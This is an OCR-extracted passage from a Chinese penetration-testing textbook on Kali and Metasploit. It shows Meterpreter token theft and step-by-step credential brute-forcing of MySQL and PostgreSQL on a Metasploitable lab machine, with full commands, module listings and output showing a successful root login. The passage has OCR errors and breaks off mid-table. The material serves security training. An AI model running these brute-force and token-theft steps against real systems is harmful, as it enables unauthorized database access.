第6章漏洞利用
Killing: 2040
（9）尝试从漏洞系统窃取一个假冒令牌。执行命令如下所示：
meterpreter > steal_token
注意：使用不同的模块，Meterpreter中的命令是不同的，有些模块中，可能不存在以上
命令。
6.4渗透攻击应用
前面依次介绍了Armitage、MSFCONSOLE和MSFCLI接口的概念及使用。本节将介
绍使用MSFCONSOLE工具渗透攻击MySQL数据库服务、PostgreSQL数据库服务、Tomcat
服务和PDF文件等。
6.4.1渗透攻击MySQL数据库服务
MySQL是一个关系型数据库管理系统，由瑞典MySQLAB公司开发，目前属于Oracle
公司。在Metasploitable系统中，MySQL的身份认证存在漏洞。该漏洞有可能会让潜在的
攻击者不必提供正确的身份证书便可访问MySQL数据库。所以，用户可以利用该漏洞，
对MySQL服务进行渗透攻击。恰好Metasploit框架提供了套针对MySQL数据库的辅助
模块，可以帮助用户更有效的进行渗透测试。本小节将介绍使用Metasploit的MySQL扫
描模块渗透攻击MySQL数据库服务。渗透攻击Metasploitable系统中MySQL数据库服务
的具体操作步骤如下所示。
（1）启动MSFCONSOLE。执行命令如下所示：
root@kali:~#msfconsole
（2）扫描所有有效的MySQL模块。执行命令如下所示：
msf > search mysql
Matching Modules
Name
Disclosure Date
Rank
Description
auxiliary/admin/http/rails_devise_pass_reset
2013-01-28
Ruby on Rails Devise
Authentication
00:00:00 UTC
Password Reset
auxiliary/admin/mysql/mysql_enum
normal
MySQL Enumeration Module
auxiliary/admin/mysql/mysql_sql
normal
MySQL SQL Generic Query
auxiliary/admin/tikiwiki/tikidblib
2006-11-01normal
TikiWiki Information Disclosure
00:00:00UTC
auxiliary/analyze/jtr_mysql_fast
normal
JohntheRipper
MySQL
Password Cracker (Fast Mode)
auxiliary/pro/webaudit/sqli_blind_timing_mysql
normal
PRO:MySQL
blind SQL
injection
module (timing)
auxiliary/scanner/mysql/mysql_authbypass
2012-06-09
normal
MySQL Authentication
Bypass
hashdump
00:00:00 UTC
duna pomssed
auxiliary/scanner/mysql/mysql_file_enum normal
MYSQLFile/DirectoryEnumerator
· 163 ·
---
## Page 176
第2篇
信息的收集及利用
auxiliary/scanner/mysql/mysql_hashdump
normal
MYSQL Password Hashdump
auxiliary/scanner/mysql/mysql_login
normal
MySQL Login Utility
auxiliary/scanner/mysql/mysql_schemadump
normal
MYSQL Schema Dump
auxiliary/scanner/mysql/mysql_version
normal
MySQL Server Version Enumeration
auxiliary/server/capture/mysql normal
Authentication Capture: MySQL
exploit/linux/mysql/mysql_yassl_getname
2010-01-25
goodMySQL
yaSSL
CertDecoder::GetName
00:00:00 UTC
Buffer Overflow
exploit/linux/mysql/mysql_yassl_hello
2008-01-04
good
MySQL
yaSSL
SSL
Hello Message
00:00:00 UTC Buffer Overflow
exploit/pro/web/sqli_mysql
2007-06-05
manual
SQL injection exploit for
MySQL
00:00:00 UTC
exploit/pro/web/sqli_mysql_php
2000-05-30
manual
SQL injection exploit for
MySQL
00:00:00 UTC
exploit/unix/webapp/kimai_sqli
2013-05-21
average
Kimai
v0.9.2
'db
restore.php' SQL
00:00:00 UTC
Injection
exploit/unix/webapp/wp_google_document
2013-01-03
normal
WordPress
Plugin
Google Document
_embedder_exec
00:00:00 UTC Embedder
Arbitrary
File
Disclosure
exploit/windows/mysql/mysql_mof
2012-12-01
excellent Oracle
MySQL
for
Microsoft Windows
00:00:00 UTC MOF Execution
exploit/windows/mysql/mysql_payload
2009-01-16
excellent Oracle
MySQL
for
Microsoft Windows
00:00:00 UTC Payload Execution
exploit/windows/mysql/mysql_yassl_hello
2008-01-04
average MySQL
yaSSL
SSL
Hello Message
00:00:00 UTC Buffer Overflow
exploit/windows/mysql/scrutinizer
2012-07-27
excellent Plixer
Scrutinizer
NetFlow and sFlow
_upload_exec 00:00:00 UTC
Analyzer 9 Default MySQL Credential
post/linux/gather/enum_configsnormal
Linux Gather Configurations
postlinux/gather/enum_users_history
normal
Linux Gather User History
msf >
输出的信息显示了MySQL上可用的模块。从这些模块中，选择渗透攻击的模块进行
攻击。
（3）这里使用MySQL扫描模块。执行命令如下所示：
msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(mysql_login) >
（4）显示模块的有效选项。执行命令如下所示：
msf auxiliary(mysql_login) > show options
Module options (auxiliary/scanner/mysql/mysql_login):
Name
Current Setting Required
Description
BLANK_PASSWORDS
true
no
Try blank passwords for all users
BRUTEFORCE_SPEED
5
yes
How fast to bruteforce, from 0 to 5
DB_ALL_CREDS
false
no
Try each user/password couple stored in the
• 164 ·
---
## Page 177
第6章漏洞利用
current database
DB_ALL_PASS
false
no
Add all passwords in the current database to the
list
DB_ALL_USERS
false
no
Add all users in the current database to the list
PASSWORD
no
A specific password to authenticate with
PASS_FILE
no
File containing passwords, one per line
RHOSTS
yes
The target address range or CIDR identifier
RPORT
3306
yes
The target port
STOP_ON_SUCCESS
false
yes
Stop guessing when a credential works for a host
THREADS
7
yes
The number of concurrent threads
USERNAME
no
A specific username to authenticate as
USERPASS_FILE
no
File containing users and passwords separated by
space, one
pair per line
USER_AS_PASS
true
no
Try the usemame as the password for all users
USER_FILE
no
File containing usernames, one per line
VERBOSE
true
yes
Whether to print output for all attempts
以上的信息显示了在mysql_login模块下可设置的选项。从输出的结果中可以看到显
示了四列信息，分别是选项名称、当前设置、需求及描述。其中Required为yes的选项是
必须配置的，反之可以不用配置。对于选项的作用，Description都有相应的介绍。
（5）为渗透攻击指定目标系统、用户文件和密码文件的位置。执行命令如下所示：
msf auxiliary(mysql_login) > set RHOSTS 192.168.41.142
RHOST => 192.168.41.142
msf auxiliary(mysql_login) > set user_file /root/Desktop/usernames.txt
user_file => /root/Desktop/usernames.txt
msf auxiliary(mysql_login) > set pass_file /root/Desktop/passwords.txt
pass_file => /root/Desktop/passwords.txt
以上信息设置了目标系统的地址，用户文件和密码文件的路径。
（6）启动渗透攻击。执行命令如下所示：
msf auxiliary(mysql_login) > exploit
[deprecated] 118n.enforce_available_locales will default to true in the future. If you really want to
skip validation of your locale you can set l18n.enforce_available_locales = false to avoid this
message.
[▪] 192.168.41.142:3306 MYSQL - Found remote MySQL version 5.0.51a
[*] 192.168.41.142:3306 MYSQL - [01/40] - Trying username:'sa' with password:"
[-] Access denied
[] 192.168.41.142:3306 MYSQL - [02/40] -Trying username:'root'with password:
[+]192.168.41.142:3306-SUCCESSFULLOGIN'root':“
[*] 192.168.41.142:3306 MYSQL - [03/40] - Trying username:*bob' with password:
[-] Access denied
[+] 192.168.41.142:3306 MYSQL - [04/40] - Trying username:*ftp' with password:"
[-] Access denied
[*] 192.168.41.142:3306 MYSQL - [05/40] - Trying username:apache' with password:"
[-] Access denied
[] 192.168.41.142:3306 MYSQL - [06/40] - Trying username:'named’ with password:"
[-] Access denied
[*] 192.168.41.142:3306 MYSQL - [07/40] - Trying username:sa' with password:'sa’
· 165 ·
---
## Page 178
第2篇信息的收集及利用
[-] Access denied
[] 192.168.41.142:3306 MYSQL - [35/40] - Trying username:'named' with password:'password
[-] Access denied
[] Scanned 1 of 1 hosts (100% complete)
[] Auxiliary module execution completed
输出的信息是渗透攻击的一个过程，尝试使用指定的用户名/密码文件中的用户名和密
码连接MySQL服务器。在渗透攻击过程中，Metasploit会尝试输入用户名和密码文件包含
的用户名和密码组合。从输出的信息中可以看到，已测试出MySQL数据库服务器的用户
名和密码分别是root和password。
6.4.2渗透攻击PostgreSQL数据库服务
PostgreSQL是一个自由的对象一关系数据库服务（数据库管理系统）。它在灵活的
BSD-风格许可证下发行。当第一次启动msfconsole时，Kali中的Metasploit会创建名称为
msf3的PostgreSQL数据库，并生成保存渗透测试数据所需的数据表。然后，使用名称为
msf3的用户，自动连接到msf3数据库。所以，攻击者可以利用这样的漏洞自动的连接到
PostgreSQL数据库。本小节将介绍使用Metasploit的PostgreSQL扫描模块渗透攻击
PostgreSQL数据库服务。渗透攻击PostgreSQL数据库服务的具体操作步骤如下所示。
（1）启动MSFCONSOLE。执行命令如下所示：
root@kali:~# msfconsole
（2）搜索所有有效的PostgreSQL模块。执行命令如下所示：
msf > search postgresql
Matching Modules
Name
Disclosure Date Rank
Description
auxiliary/admin/http/rails_devise_pass_reset
2013-01-28
normal
Ruby on Rails Devise
00:00:00 UTC
Authentication
Password Reset
auxiliary/admin/postgres/postgres_readfile
normal
PostgreSQL
Server
Generic
Query
auxiliary/admin/postgres/postgres_sql
normal
PostgreSQL
Server
Generic
Query
auxiliary/scanner/postgres/postgres_
normal
PostgreSQL Database Name
dbname_flag_injection
Command Line Flag Injection
auxiliary/scanner/postgres/postgres_login
normal
PostgreSQL Login Utility
auxiliary/scanner/postgres/postgres_version
normal
PostgreSQL Version Probe
auxiliary/server/capture/postgresql
normal
Authentication
Capture:
PostgreSQL
exploit/linux/postgres/postgres_payload
2007-06-05
excellent PostgreSQL for Linux
Payload
00:00:00 UTC Execution
exploit/pro/web/sqli_postgres
2007-06-05
manualSQL injection exploit for
PostgreSQL
00:00:00UTC
exploit/windows/postgres/postgres_payload
2009-04-10
excellent PostgreSQL
for
*166 *
---
## Page 179
第6章漏洞利用
Microsoft Windows
00:00:00UTC
Payload Execution
以上信息显示了PostgreSQL所有相关的模块。此时可以选择相应的模块进行攻击。
（3）使用PostgreSQL扫描模块。执行命令如下所示：
msf > use auxiliary/scanner/postgres/postgres_login
（4）查看PostgreSQL模块的所有选项。执行命令如下所示：
msf auxiliary(postgres_login) > show options
Module options (auxiliary/scanner/postgres/postgres_login):
Name
Current Setting
Required
Description
BLANK
true
no
Try blank passwords for all users
PASSWORDS
BRUTEFORCE_
5